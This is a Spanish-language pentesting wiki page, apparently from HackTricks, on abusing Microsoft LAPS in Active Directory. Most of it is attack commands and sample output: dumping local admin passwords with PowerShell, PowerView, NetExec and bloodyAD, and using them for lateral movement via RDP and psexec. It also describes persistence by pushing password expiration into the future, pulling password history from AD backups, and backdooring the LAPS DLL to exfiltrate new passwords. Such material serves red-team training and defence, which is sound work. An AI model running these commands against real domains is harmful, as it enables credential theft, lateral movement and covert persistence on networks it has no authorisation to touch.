# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Actualmente hay **2 variantes de LAPS** que puedes encontrar durante una assessment:

- **Legacy Microsoft LAPS**: almacena la contraseña del administrador local en **`ms-Mcs-AdmPwd`** y el tiempo de expiración en **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (integrado en Windows desde las actualizaciones de abril de 2023): todavía puede emular el modo legacy, pero en modo nativo usa atributos **`msLAPS-*`**, soporta **password encryption**, **password history**, y **DSRM password backup** para domain controllers.

LAPS está diseñado para gestionar **local administrator passwords**, haciéndolas **únicas, aleatorias y cambiadas con frecuencia** en equipos unidos al dominio. Si puedes leer esos atributos, normalmente puedes **pivot as the local admin** al host afectado. En muchos entornos, la parte interesante no es solo leer la contraseña en sí, sino también descubrir **a quién se le delegó acceso** a los atributos de la contraseña.

### Legacy Microsoft LAPS attributes

En los objetos de equipo del dominio, la implementación de legacy Microsoft LAPS da como resultado la adición de dos atributos:

- **`ms-Mcs-AdmPwd`**: **contraseña del administrador en texto claro**
- **`ms-Mcs-AdmPwdExpirationTime`**: **tiempo de expiración de la contraseña**

### Windows LAPS attributes

Native Windows LAPS añade varios atributos nuevos a los objetos de equipo:

- **`msLAPS-Password`**: blob de contraseña en texto claro almacenado como JSON cuando no está habilitada la encryption
- **`msLAPS-PasswordExpirationTime`**: tiempo de expiración programado
- **`msLAPS-EncryptedPassword`**: contraseña actual cifrada
- **`msLAPS-EncryptedPasswordHistory`**: historial de contraseñas cifrado
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: datos cifrados de la contraseña DSRM para domain controllers
- **`msLAPS-CurrentPasswordVersion`**: seguimiento de versión basado en GUID usado por la lógica más nueva de detección de rollback (Windows Server 2025 forest schema)

Cuando **`msLAPS-Password`** es legible, el valor es un objeto JSON que contiene el nombre de la cuenta, la hora de actualización y la contraseña en texto claro, por ejemplo:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Comprueba si está activado
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Acceso a la contraseña de LAPS

Podrías **descargar la política raw de LAPS** desde `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` y luego usar **`Parse-PolFile`** del paquete [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para convertir este archivo a un formato legible por humanos.

### Legacy Microsoft LAPS PowerShell cmdlets

Si el módulo legacy de LAPS está instalado, normalmente están disponibles los siguientes cmdlets:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Cmdlets de PowerShell de Windows LAPS

Windows LAPS nativo incluye un nuevo módulo de PowerShell y nuevos cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Algunos detalles operativos importan aquí:

- **`Get-LapsADPassword`** maneja automáticamente **legacy LAPS**, **clear-text Windows LAPS** y **encrypted Windows LAPS**.
- Si la password está encrypted y puedes **read** pero no **decrypt** it, el cmdlet devuelve metadata pero no la clear-text password.
- **Password history** solo está disponible cuando **Windows LAPS encryption** está habilitado.
- En domain controllers, la fuente devuelta puede ser **`EncryptedDSRMPassword`**.

### PowerView / LDAP

**PowerView** también se puede usar para averiguar **quién puede read the password y read it**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Si **`msLAPS-Password`** es legible, analiza el JSON devuelto y extrae **`p`** para la contraseña y **`n`** para el nombre de la cuenta de administrador local administrada.

### Linux / remote tooling

Las herramientas modernas soportan tanto legacy Microsoft LAPS como Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notas:

- Las compilaciones recientes de **NetExec** soportan **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** y **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** sigue siendo útil para **legacy Microsoft LAPS** desde Linux, pero solo apunta a **`ms-Mcs-AdmPwd`**.
- Si el entorno usa **encrypted Windows LAPS**, una simple lectura LDAP no es suficiente; también necesitas ser un **authorized decryptor** o abusar de una ruta de decrypt soportada.

### Directory synchronization abuse

Si tienes permisos de sincronización a nivel de dominio **directory synchronization** en lugar de acceso directo de lectura sobre cada objeto de equipo, LAPS aún puede ser interesante.

La combinación de **`DS-Replication-Get-Changes`** con **`DS-Replication-Get-Changes-In-Filtered-Set`** o **`DS-Replication-Get-Changes-All`** puede usarse para sincronizar atributos **confidential / RODC-filtered** como el legacy **`ms-Mcs-AdmPwd`**. BloodHound modela esto como **`SyncLAPSPassword`**. Revisa [DCSync](dcsync.md) para el contexto de los permisos de replication.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita la enumeración de LAPS con varias funciones.\
Una es analizar **`ExtendedRights`** para **todos los computers con LAPS habilitado.** Esto muestra **groups** específicamente **delegados para leer contraseñas LAPS**, que a menudo son usuarios en grupos protegidos.\
Una **account** que ha **unido un computer** a un domain recibe `All Extended Rights` sobre ese host, y este permiso le da a la **account** la capacidad de **leer passwords**. La enumeración puede mostrar una cuenta de usuario que puede leer la contraseña LAPS en un host. Esto puede ayudarnos a **apuntar a usuarios específicos de AD** que pueden leer contraseñas LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Volcado de contraseñas de LAPS con NetExec / CrackMapExec

Si no tienes un PowerShell interactivo, puedes abusar de este privilegio de forma remota mediante LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Esto volca todos los secretos de LAPS que el usuario puede leer, permitiéndote moverte lateralmente con una contraseña de administrador local diferente.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistencia de LAPS

### Fecha de expiración

Una vez admin, es posible **obtener las contraseñas** y **evitar** que una máquina **actualice** su **contraseña** **configurando la fecha de expiración en el futuro**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS usa **`msLAPS-PasswordExpirationTime`** en su lugar:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> La contraseña seguirá rotando si un **admin** usa **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, o si **Do not allow password expiration time longer than required by policy** está habilitado.

### Recuperación de contraseñas históricas desde backups de AD

Cuando **Windows LAPS encryption + password history** está habilitado, los backups montados de AD pueden convertirse en una fuente adicional de secretos. Si puedes acceder a un snapshot de AD montado y usar **recovery mode**, puedes consultar contraseñas almacenadas anteriores sin hablar con un DC en vivo.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Esto es principalmente relevante durante **AD backup theft**, **offline forensics abuse** o **disaster-recovery media access**.

### Backdoor

El código fuente original para legacy Microsoft LAPS se puede encontrar [aquí](https://github.com/GreyCorbel/admpwd), por lo tanto es posible poner un backdoor en el código (dentro del método `Get-AdmPwdPassword` en `Main/AdmPwd.PS/Main.cs`, por ejemplo) que de alguna manera **exfiltrate new passwords o las almacene en algún lugar**.

Luego, compila el nuevo `AdmPwd.PS.dll` y súbelo a la máquina en `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (y cambia la modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
